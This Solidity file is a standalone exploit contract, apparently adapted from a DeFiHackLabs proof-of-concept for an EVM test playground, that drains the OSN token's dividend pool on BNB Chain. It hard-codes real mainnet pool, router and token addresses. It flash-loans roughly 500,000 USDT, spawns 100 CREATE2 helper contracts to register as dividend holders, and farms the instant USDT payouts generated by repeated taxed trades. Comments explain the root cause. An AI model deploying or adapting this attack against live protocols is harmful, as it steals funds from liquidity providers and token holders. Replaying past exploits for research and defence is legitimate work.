// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-05-OSN).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test
// contract (ContractTest is Test; testExploit() flash-loans from a
// PancakeV3-style pool and the flash callback `pancakeV3FlashCallback` lives
// on the test itself), so there is no standalone exploit contract to deploy.
// This is a self-contained standalone copy of that inline attack
// (testExploit -> run(), pancakeV3FlashCallback unchanged, including the 100
// CREATE2-deployed `Money` helper contracts) so the playground can deploy it
// and record run(). Logic and constants are copied verbatim from
// test/OSN_exp.sol, except the raw `create2` assembly deploy loop is replaced
// with Solidity's `new Money{salt: bytes32(i)}()`, which produces the exact
// same CREATE2 address (same init code, same deployer, same salt) while being
// far more compact -- the deployment ADDRESSES are irrelevant to the attack
// (each Money only needs to be reachable at a deterministic address so it can
// be pre-funded before being deployed), so this substitution is behavior
// preserving.
//
// Root cause (see OSN_exp.md): OSN.DividendTracker.setBalance() -- called on
// every LP add/remove -- updates a holder's dividend share and IMMEDIATELY
// calls processAccount(account, true), which pays out the holder's full
// pending USDT dividend right away. That direct payout path is not gated by
// claimWait/canAutoClaim (only the iterating process() loop is), contracts
// are not excluded from dividends, and the minimum eligible balance is 1 wei.
// The attacker flash-borrows USDT, becomes the dominant LP holder, manufactures
// dividends by churning buy/sell through OSN's 3.5% sell tax, and spreads its
// LP across 100 throwaway `Money` contracts so each registers as a holder and
// collects its slice instantly -- capturing ~93% of the sell-tax USDT it just
// generated, in the same transaction.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IUniPairV3 {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface IUniPairV2 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
}

interface IUniRouterV2 {
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB);

    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IMoney {
    function addLiq(uint256 value) external;
    function cc() external;
}

contract OSNDrain {
    IUniPairV3 internal constant POOL = IUniPairV3(0x46Cf1cF8c69595804ba91dFdd8d6b960c9B0a7C4);
    IUniRouterV2 internal constant ROUTER = IUniRouterV2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IERC20 internal constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 internal constant OSN = IERC20(0x810f4C6AE97BCC66DA5Ae6383CC31BD3670f6d13);
    IUniPairV2 internal constant OSN_PAIR = IUniPairV2(0x4EEDdCc7C8714A684311F8b01154B5686A0f612f);

    uint256 internal constant HELPER_COUNT = 100;

    // entrypoint: recorded by the playground. Mirrors testExploit(), which
    // just sets borrow_amount and calls pool.flash() -- the entire attack
    // executes inside the flash callback below.
    function run() external {
        uint256 borrowAmount = 500_009_458_043_549_158_462_637;
        POOL.flash(address(this), borrowAmount, 0, "");
    }

    // PancakeSwap V3-style flash callback (verbatim from ContractTest).
    function pancakeV3FlashCallback(uint256 fee0, uint256, /*fee1*/ bytes memory /*data*/ ) public {
        OSN.approve(address(ROUTER), type(uint256).max - 1);
        USDT.approve(address(ROUTER), type(uint256).max - 1);
        OSN_PAIR.approve(address(ROUTER), type(uint256).max - 1);
        uint256 usdtBalance = USDT.balanceOf(address(this));
        swapTokenToExactToken(address(USDT), address(OSN), 10_000 ether, usdtBalance);
        swapTokenToExactToken(address(USDT), address(OSN), 10_000 ether, usdtBalance);
        swapTokenToExactToken(address(USDT), address(OSN), 10_000 ether, usdtBalance);
        swapTokenToExactToken(address(USDT), address(OSN), 10_000 ether, usdtBalance);
        swapTokenToExactToken(address(USDT), address(OSN), 10_000 ether, usdtBalance);
        swapTokenToExactToken(address(USDT), address(OSN), 10_000 ether, usdtBalance);
        swapTokenToExactToken(address(USDT), address(OSN), 10_000 ether, usdtBalance);
        usdtBalance = USDT.balanceOf(address(this));
        uint256 osnBalance = OSN.balanceOf(address(this)) - 100 * 1_000_000_000_000_000; // reserve dust to seed helpers
        ROUTER.addLiquidity(
            address(USDT), address(OSN), usdtBalance, osnBalance, 0, 0, address(this), block.timestamp
        );
        uint256 pairBalance = OSN_PAIR.balanceOf(address(this));

        // step 1: pre-fund each not-yet-deployed helper's precomputed CREATE2 address.
        for (uint256 i = 0; i < HELPER_COUNT; i++) {
            address money = calcAddress(i);
            USDT.transfer(money, 1_000_000_000_000_000);
            OSN.transfer(money, 1_000_000_000_000_000);
        }

        // step 2: deploy the 100 helpers. Each constructor immediately
        // addLiquidity()s its dust, registering itself as an OSN dividend
        // holder via OSN._transfer's LP-add path (setBalance).
        for (uint256 i = 0; i < HELPER_COUNT; i++) {
            new Money{ salt: bytes32(i) }();
        }

        // step 3: hand each helper a slice of the dominant LP position and
        // trigger its own setBalance -> processAccount registration.
        for (uint256 i = 0; i < HELPER_COUNT; i++) {
            address money = calcAddress(i);
            OSN_PAIR.transfer(money, pairBalance);
            IMoney(money).addLiq(pairBalance);
        }
        ROUTER.removeLiquidity(
            address(USDT), address(OSN), OSN_PAIR.balanceOf(address(this)), 0, 0, address(this), block.timestamp
        );

        // step 4: manufacture dividends by churning buy/sell through OSN's
        // 3.5% sell tax -- each sell funds a new USDT distribution round.
        for (uint256 i = 0; i < 10; i++) {
            swapTokenToExactToken(address(USDT), address(OSN), 10_000 ether, usdtBalance);
            swapTokenToToken(address(OSN), address(USDT), OSN.balanceOf(address(this)));
        }

        // step 5: collect. Each helper's cc() re-triggers setBalance ->
        // processAccount, paying out its accrued USDT dividend instantly
        // (no claimWait gate on this path), then forwards it to us.
        for (uint256 i = 0; i < HELPER_COUNT; i++) {
            address money = calcAddress(i);
            IMoney(money).cc();
        }

        USDT.transfer(address(POOL), 500_009_458_043_549_158_462_637 + fee0);
    }

    function swapTokenToExactToken(address a, address b, uint256 amountOut, uint256 amountInMax) internal {
        IERC20(a).approve(address(ROUTER), amountInMax);
        address[] memory path = new address[](2);
        path[0] = a;
        path[1] = b;
        ROUTER.swapTokensForExactTokens(amountOut, amountInMax, path, address(this), block.timestamp);
    }

    function swapTokenToToken(address a, address b, uint256 amount) internal {
        IERC20(a).approve(address(ROUTER), amount);
        address[] memory path = new address[](2);
        path[0] = a;
        path[1] = b;
        ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(amount, 0, path, address(this), block.timestamp);
    }

    // CREATE2 address of `new Money{salt: bytes32(i)}()` deployed from this
    // contract -- same formula (keccak256(0xff ++ deployer ++ salt ++
    // keccak256(initcode))) as the original test's raw `create2` opcode, so
    // this matches the original's `cal_address(i)` exactly.
    function calcAddress(uint256 i) internal view returns (address) {
        bytes32 initCodeHash = keccak256(type(Money).creationCode);
        bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), bytes32(i), initCodeHash));
        return address(uint160(uint256(hash)));
    }
}

// Throwaway CREATE2-deployed dividend-farming helper, mirroring the original
// test's nested `Money` contract verbatim: registers itself as an OSN LP
// dividend holder on construction, then lets the deployer re-trigger
// setBalance (via addLiq/cc) to collect the instant USDT payout.
contract Money {
    IUniRouterV2 internal constant ROUTER = IUniRouterV2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IERC20 internal constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 internal constant OSN = IERC20(0x810f4C6AE97BCC66DA5Ae6383CC31BD3670f6d13);
    IUniPairV2 internal constant OSN_PAIR = IUniPairV2(0x4EEDdCc7C8714A684311F8b01154B5686A0f612f);
    address internal owner;

    constructor() {
        owner = msg.sender;
        OSN_PAIR.approve(address(ROUTER), type(uint256).max - 1);
        USDT.approve(address(ROUTER), type(uint256).max - 1);
        OSN.approve(address(ROUTER), type(uint256).max - 1);
        ROUTER.addLiquidity(address(USDT), address(OSN), 100_000, 100_000, 0, 0, address(this), block.timestamp);
    }

    function addLiq(uint256 value) public {
        ROUTER.removeLiquidity(address(USDT), address(OSN), 35_524, 0, 0, address(this), block.timestamp);
        OSN_PAIR.transfer(address(owner), value);
    }

    function cc() public {
        ROUTER.addLiquidity(address(USDT), address(OSN), 100_000, 100_000, 0, 0, address(this), block.timestamp);
        USDT.transfer(address(owner), USDT.balanceOf(address(this)));
    }
}
